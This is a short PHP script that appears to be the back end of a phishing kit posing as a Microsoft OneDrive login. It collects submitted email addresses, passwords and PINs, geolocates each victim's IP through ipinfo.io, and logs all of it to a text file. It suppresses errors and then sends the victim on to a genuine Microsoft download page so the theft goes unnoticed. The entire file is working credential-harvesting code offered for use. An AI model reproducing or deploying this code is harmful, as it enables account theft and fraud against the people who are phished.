<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
	
	$file = fopen("DIOESLAVUELTA302130.txt", "a");
	
fwrite($file, "Correo: ".$_POST['entrar']."  - Psswrd: ".$_POST['EntrarPass']." - Pin ".$_POST['numero']." Fecha: ".date('Y-m-d')." - ".date('H:i:s')." - ".$userp." ".$cc." ".$city."  " . PHP_EOL);
fwrite($file, "----------------------------------------- " . PHP_EOL);
fclose($file);

header("location:https://www.microsoft.com/es-es/microsoft-365/onedrive/download");

?> 